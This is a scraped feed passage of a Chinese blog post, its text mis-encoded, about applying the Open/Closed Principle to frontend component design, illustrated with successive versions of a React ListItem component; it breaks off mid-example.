<p>åŸæ–‡ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fsearch-labs%2Fblog%2Fhybrid-search-multi-stage-retrieval-esql" title="https://www.elastic.co/search-labs/blog/hybrid-search-multi-stage-retrieval-esql" target="_blank" ref="nofollow noopener noreferrer">www.elastic.co/search-labsâ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‰ç«¯å‘æ¶æ„çªå›´ç³»åˆ— - æ¡†æ¶è®¾è®¡ï¼ˆä¸‰ï¼‰ï¼šç”¨å¼€é—­åŸåˆ™æ‹¯æ•‘ä½ çš„ç»„ä»¶åº“]]></title>    <link>https://juejin.cn/post/7592996072705163314</link>    <guid>https://juejin.cn/post/7592996072705163314</guid>    <pubDate>2026-01-09T03:42:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592996072705163314" data-draft-id="7592906873089441838" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‰ç«¯å‘æ¶æ„çªå›´ç³»åˆ— - æ¡†æ¶è®¾è®¡ï¼ˆä¸‰ï¼‰ï¼šç”¨å¼€é—­åŸåˆ™æ‹¯æ•‘ä½ çš„ç»„ä»¶åº“"/> <meta itemprop="keywords" content="å‰ç«¯,æ¶æ„"/> <meta itemprop="datePublished" content="2026-01-09T03:42:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å‰ç«¯ç‹å£®å£®"/> <meta itemprop="url" content="https://juejin.cn/user/4473272506789485"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‰ç«¯å‘æ¶æ„çªå›´ç³»åˆ— - æ¡†æ¶è®¾è®¡ï¼ˆä¸‰ï¼‰ï¼šç”¨å¼€é—­åŸåˆ™æ‹¯æ•‘ä½ çš„ç»„ä»¶åº“
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4473272506789485/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å‰ç«¯ç‹å£®å£®
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T03:42:59.000Z" title="Fri Jan 09 2026 03:42:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"ã€Œ";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"ã€";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"Â»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><blockquote>
<p><strong>å†™åœ¨å‰é¢</strong></p>
<p>å…„å¼Ÿä»¬ï¼Œå›æƒ³ä¸€ä¸‹ï¼Œä½ æœ‰æ²¡æœ‰æ¥è¿‡è¿™ç§éœ€æ±‚ï¼š</p>
<p>äº§å“ç»ç†è·‘æ¥è¯´ï¼šâ€œå’±ä»¬é‚£ä¸ªé€šç”¨çš„è¡¨æ ¼ç»„ä»¶ï¼Œç°åœ¨éœ€è¦åœ¨æŸä¸€åˆ—åŠ ä¸ªè‡ªå®šä¹‰çš„æ¸²æŸ“é€»è¾‘ï¼Œä»¥å‰æ˜¯çº¯æ–‡æœ¬ï¼Œç°åœ¨è¦å˜æˆä¸ªå¸¦å›¾æ ‡çš„æŒ‰é’®ï¼Œè¿˜èƒ½ç‚¹å‡»å¼¹çª—ã€‚â€</p>
<p>ä½ å¿ƒæƒ³ï¼šâ€œè¿™è¿˜ä¸ç®€å•ï¼Ÿâ€</p>
<p>äºæ˜¯ä½ æ‰“å¼€äº†é‚£ä¸ªç¥–ä¼ çš„ <code>CommonTable.vue</code> æˆ– <code>Table.tsx</code>ï¼Œæ‰¾åˆ°äº†æ¸²æŸ“å•å…ƒæ ¼çš„åœ°æ–¹ï¼Œç†Ÿç»ƒåœ°å†™ä¸‹äº†ä¸€ä¸ª <code>if-else</code>ã€‚</p>
<p>è¿‡äº†ä¸¤å¤©ï¼Œäº§å“åˆæ¥äº†ï¼šâ€œé‚£å•¥ï¼Œå¦ä¸€åˆ—ä¹Ÿè¦æ”¹ï¼Œè¿™æ¬¡è¦åŠ ä¸ªè¿›åº¦æ¡ã€‚â€</p>
<p>ä½ åˆç†Ÿç»ƒåœ°åŠ äº†ä¸€ä¸ª <code>else-if</code>ã€‚</p>
<p>å‡ ä¸ªæœˆåï¼Œè¿™ä¸ªç»„ä»¶çš„æºç å·²ç»çªç ´äº† 2000 è¡Œï¼Œå…‰é‚£ä¸ª <code>if-else</code> çš„åˆ¤æ–­é€»è¾‘å°±å äº†åŠå±ã€‚åæ¥çš„åŒäº‹æ¥æ‰‹æ—¶ï¼Œçœ‹ç€è¿™å¨ä»£ç ï¼Œåªæƒ³æŠŠä½ æ‹‰é»‘ã€‚</p>
<p>è¿™ç§â€œæ”¹å“ªå“ªç–¼ï¼Œç‰µä¸€å‘è€ŒåŠ¨å…¨èº«â€çš„ä»£ç ï¼Œå°±æ˜¯å…¸å‹çš„è¿åäº†<strong>å¼€é—­åŸåˆ™ (Open/Closed Principle, OCP)</strong> ã€‚ä»Šå¤©å’±ä»¬å°±æ¥èŠèŠï¼Œæ€ä¹ˆç”¨ OCP æŠŠè¿™å¨ä»£ç é‡æ„æˆâ€œäººè¯â€ã€‚</p>
</blockquote>
<hr/>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/362af4a3a08c45f6b5e79878e0393259~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv546L5aOu5aOu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534978&amp;x-signature=8LBXGrcsSdhSyyEzCMGIidC2Ruo%3D" alt="39072abf-1240-4203-a664-62f3074c67cd.png" loading="lazy"/></p>
<h2 data-id="heading-0">ä»€ä¹ˆæ˜¯å¼€é—­åŸåˆ™ (OCP)ï¼Ÿ</h2>
<p>å¼€é—­åŸåˆ™ï¼Œå¬èµ·æ¥å¾ˆé«˜å¤§ä¸Šï¼Œå…¶å®è¯´äººè¯å°±æ˜¯å…«ä¸ªå­—ï¼š</p>
<p><strong>å¯¹æ‰©å±•å¼€æ”¾ï¼Œå¯¹ä¿®æ”¹å…³é—­ã€‚</strong></p>
<ul>
<li><strong>å¯¹æ‰©å±•å¼€æ”¾ (Open for extension)</strong> ï¼šå½“æœ‰æ–°éœ€æ±‚æ¥äº†ï¼Œä½ åº”è¯¥èƒ½é€šè¿‡â€œå¢åŠ æ–°ä»£ç â€çš„æ–¹å¼æ¥æ»¡è¶³ï¼Œè€Œä¸æ˜¯å»æ”¹æ—§ä»£ç ã€‚</li>
<li><strong>å¯¹ä¿®æ”¹å…³é—­ (Closed for modification)</strong> ï¼šé‚£ä¸ªå·²ç»å†™å¥½ã€æµ‹è¯•è¿‡ã€ç¨³å®šè¿è¡Œçš„æ ¸å¿ƒä»£ç ï¼Œä½ å°½é‡åˆ«å»åŠ¨å®ƒã€‚</li>
</ul>
<p>æƒ³è±¡ä¸€ä¸‹ä½ çš„ç”µè„‘ä¸»æœºã€‚ä½ æƒ³åŠ ä¸ªæ˜¾å¡ï¼Œæ˜¯ç›´æ¥æŠŠä¸»æ¿ç„Šå¼€æ¥çº¿ï¼ˆä¿®æ”¹ï¼‰ï¼Œè¿˜æ˜¯æ‰¾ä¸ª PCI-E æ’æ§½æ’ä¸Šå»ï¼ˆæ‰©å±•ï¼‰ï¼Ÿæ˜¾ç„¶åè€…æ›´é è°±ã€‚</p>
<p>åœ¨å‰ç«¯é¢†åŸŸï¼ŒOCP æœ€å…¸å‹çš„åº”ç”¨åœºæ™¯å°±æ˜¯<strong>ç»„ä»¶è®¾è®¡</strong>å’Œ<strong>æ’ä»¶ç³»ç»Ÿ</strong>ã€‚</p>
<hr/>
<h2 data-id="heading-1">æ¡ˆä¾‹åˆ†æï¼šä¸€ä¸ªâ€œè¿å OCPâ€çš„ç³Ÿç³•ç»„ä»¶</h2>
<p>å’±ä»¬å°±æ‹¿æœ€å¸¸è§çš„<strong>é€šç”¨åˆ—è¡¨é¡¹ç»„ä»¶</strong>æ¥ä¸¾ä¾‹ã€‚å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ª <code>ListItem</code> ç»„ä»¶ï¼Œç”¨æ¥å±•ç¤ºç”¨æˆ·ä¿¡æ¯ã€‚</p>
<h3 data-id="heading-2">åŸå§‹éœ€æ±‚</h3>
<p>éœ€æ±‚å¾ˆç®€å•ï¼šå±•ç¤ºç”¨æˆ·çš„å¤´åƒå’Œåå­—ã€‚</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ListItem.tsx (V1)</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">avatar</span>: <span class="hljs-built_in">string</span>;
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">ListItem</span> = (<span class="hljs-params">{ user }: { user: User }</span>) =&gt; {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"list-item"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">{user.avatar}</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">{user.name}</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>{user.name}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};
</code></pre>
<p>è¿™ä»£ç çœ‹èµ·æ¥æ²¡æ¯›ç—…ï¼Œæ¸…çˆ½ã€ç®€å•ã€‚</p>
<h3 data-id="heading-3">éœ€æ±‚å˜æ›´ 1ï¼šåŠ ä¸ª VIP æ ‡å¿—</h3>
<p>äº§å“è¯´ï¼šâ€œæœ‰äº›ç”¨æˆ·æ˜¯ VIPï¼Œåå­—åé¢å¾—åŠ ä¸ªé‡‘ç¿ç¿çš„çš‡å† å›¾æ ‡ã€‚â€</p>
<p>ä½ å¿ƒæƒ³ï¼Œå°caseï¼Œä¸€æŠŠæ¢­ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ListItem.tsx (V2 - å¼€å§‹å˜å‘³äº†)</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">avatar</span>: <span class="hljs-built_in">string</span>;
  isVip?: <span class="hljs-built_in">boolean</span>; <span class="hljs-comment">// æ–°å¢å­—æ®µ</span>
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">ListItem</span> = (<span class="hljs-params">{ user }: { user: User }</span>) =&gt; {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"list-item"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">{user.avatar}</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">{user.name}</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>{user.name}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
      {/* ä¿®æ”¹ç‚¹ï¼šç¡¬ç¼–ç é€»è¾‘ */}
      {user.isVip &amp;&amp; <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"vip-icon"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};
</code></pre>
<p>ä½ ä¸ºäº†è¿™ä¸ªæ–°éœ€æ±‚ï¼Œ<strong>ä¿®æ”¹</strong>äº† <code>ListItem</code> ç»„ä»¶çš„å†…éƒ¨å®ç°ã€‚è™½ç„¶åªåŠ äº†ä¸€è¡Œï¼Œä½†åå¤´å·²ç»å¼€äº†ã€‚</p>
<h3 data-id="heading-4">éœ€æ±‚å˜æ›´ 2ï¼šå†åŠ ä¸ªåœ¨çº¿çŠ¶æ€</h3>
<p>äº§å“åˆæ¥äº†ï¼šâ€œå¾—æ˜¾ç¤ºç”¨æˆ·åœ¨ä¸åœ¨çº¿ï¼Œåœ¨çº¿çš„å¤´åƒæ—è¾¹äº®ä¸ªç»¿ç¯ã€‚â€</p>
<p>ä½ å¹äº†å£æ°”ï¼Œç»§ç»­æ¢­ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ListItem.tsx (V3 - å‘³é“è¶Šæ¥è¶Šå†²)</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">avatar</span>: <span class="hljs-built_in">string</span>;
  isVip?: <span class="hljs-built_in">boolean</span>;
  isOnline?: <span class="hljs-built_in">boolean</span>; <span class="hljs-comment">// åˆæ–°å¢å­—æ®µ</span>
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">ListItem</span> = (<span class="hljs-params">{ user }: { user: User }</span>) =&gt; {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"list-item"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"avatar-wrapper"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">{user.avatar}</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">{user.name}</span> /&gt;</span>
        {/* ä¿®æ”¹ç‚¹ï¼šåˆç¡¬ç¼–ç é€»è¾‘ */}
        {user.isOnline &amp;&amp; <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"online-dot"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>}
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>{user.name}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
